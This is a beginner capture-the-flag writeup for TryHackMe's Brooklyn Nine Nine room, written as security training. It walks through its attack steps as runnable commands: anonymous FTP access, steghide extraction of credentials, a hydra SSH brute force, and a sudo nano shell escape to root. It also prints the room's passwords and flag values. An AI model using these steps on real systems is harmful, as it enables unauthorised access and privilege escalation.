# Brooklyn Nine Nine — TryHackMe Writeup

| Field      | Details              |
|------------|----------------------|
| Platform   | TryHackMe            |
| Room       | Brooklyn Nine Nine   |
| Difficulty | Easy                 |
| Category   | CTF / Privilege Escalation / Steganography |

---

## Introduction

Brooklyn Nine Nine is a beginner-friendly CTF room themed around the popular TV show. It involves enumerating a target machine, finding credentials hidden in a steganographic image, logging in via FTP and SSH, and escalating privileges to root using a misconfigured sudo binary. There are two intended paths to user — one via FTP and one via SSH brute-force — and a clean privilege escalation route to root.

---

## Enumeration

### Nmap Scan

Started with a full port scan to identify open services:

```bash
nmap -sV -sC -T4 10.10.x.x
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 21   | FTP     | vsftpd 3.0.3 (anonymous login allowed) |
| 22   | SSH     | OpenSSH 7.6p1 |
| 80   | HTTP    | Apache httpd 2.4.29 |

Key finding: **FTP allows anonymous login** — this is the first entry point.

---

## Web Enumeration

### Port 80 — HTTP

Navigated to `http://10.10.x.x` in the browser. The page shows a Brooklyn Nine-Nine themed landing page with an image of the cast.

Checked the page source — found a comment left by the developer:

```html
<!-- Have you ever heard of steganography? -->
```

This hints that the image on the page contains hidden data. Downloaded the image for later analysis:

```bash
wget http://10.10.x.x/brooklyn99.jpg
```

---

## FTP — Anonymous Login

Connected to FTP using anonymous credentials:

```bash
ftp 10.10.x.x
# Username: anonymous
# Password: (blank)
```

Listed available files:

```
ftp> ls
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
```

Downloaded the note:

```bash
ftp> get note_to_jake.txt
```

**Contents of `note_to_jake.txt`:**

```
From Amy,

Jake please change your password. It is too weak and could be easily brute forced. 
Your password is not that strong, please change it.
```

This reveals that **Jake's SSH password is weak** and bruteforceable — hinting at the second path to user.

---

## Path 1 — Steganography (Holt)

### Extracting Hidden Data from the Image

Used `steghide` to extract hidden content from the downloaded image. Tried with an empty passphrase first:

```bash
steghide extract -sf brooklyn99.jpg
# Passphrase: (blank/Enter)
```

Successfully extracted a file:

```
wrote extracted data to "note.txt".
```

**Contents of `note.txt`:**

```
Holts Password:
fluffydog12@ninenine

Bingo!
```

This gives us **Holt's SSH credentials**.

### SSH Login as Holt

```bash
ssh holt@10.10.x.x
# Password: fluffydog12@ninenine
```

Successfully logged in. Retrieved the user flag:

```bash
cat user.txt
```

> **User Flag: `ee11cbb19052e40b07aac0ca060c23ee`**

---

## Path 2 — SSH Brute Force (Jake)

The note from FTP tells us Jake has a weak password. Used `hydra` to brute-force Jake's SSH login:

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.x.x -t 4
```

**Result:** Credentials found — `jake : 987654321`

```bash
ssh jake@10.10.x.x
# Password: 987654321
```

Also lands user access (same `user.txt` flag).

---

## Privilege Escalation — Root

### Sudo Enumeration

After logging in (as either user), checked sudo permissions:

```bash
sudo -l
```

**Output for Holt:**

```
(ALL) NOPASSWD: /bin/nano
```

Holt can run `nano` as root without a password. `nano` is exploitable via GTFOBins to spawn a root shell.

### Exploiting nano via GTFOBins

```bash
sudo nano
```

Inside nano, execute a shell:

```
^R^X
# Then type:
reset; sh 1>&0 2>&0
```

This drops into a root shell. Retrieved the root flag:

```bash
cat /root/root.txt
```

> **Root Flag: `63a9f0ea7bb98050796b649e85481845`**

---

## Summary

| Step                    | Method / Tool                          | Finding / Result                          |
|-------------------------|----------------------------------------|-------------------------------------------|
| Port Scan               | `nmap -sV -sC`                         | FTP (anon), SSH, HTTP open                |
| Web Recon               | Browser + source view                  | Steganography hint + image download       |
| FTP Anonymous Login     | `ftp`                                  | `note_to_jake.txt` — Jake has weak password |
| Steganography (Path 1)  | `steghide extract`                     | Holt's SSH credentials                    |
| SSH Brute Force (Path 2)| `hydra` + rockyou.txt                  | Jake's credentials: `987654321`           |
| User Flag               | `cat user.txt`                         | `ee11cbb19052e40b07aac0ca060c23ee`        |
| Sudo Enumeration        | `sudo -l`                              | `nano` with NOPASSWD as root              |
| Privilege Escalation    | GTFOBins — `nano` sudo escape          | Root shell                                |
| Root Flag               | `cat /root/root.txt`                   | `63a9f0ea7bb98050796b649e85481845`        |

---

## Key Takeaways

- **Anonymous FTP** is a common misconfiguration that exposes internal notes, credentials, or sensitive files — always enumerate it.
- **Steganography** tools like `steghide` are worth trying on any images found during web recon, especially when source code hints at it.
- **Weak passwords** are a genuine attack vector — `hydra` + `rockyou.txt` is enough to crack simple numeric passwords like `987654321`.
- **GTFOBins** is an essential reference for privilege escalation. Editors like `nano`, `vim`, and `less` can all be abused to escape to a shell when run with sudo.
- Always run `sudo -l` as the first step after getting a shell — misconfigured sudo entries are one of the most common privesc vectors on CTF machines and in real environments alike.

---

*Writeup by v3n0m | TryHackMe*
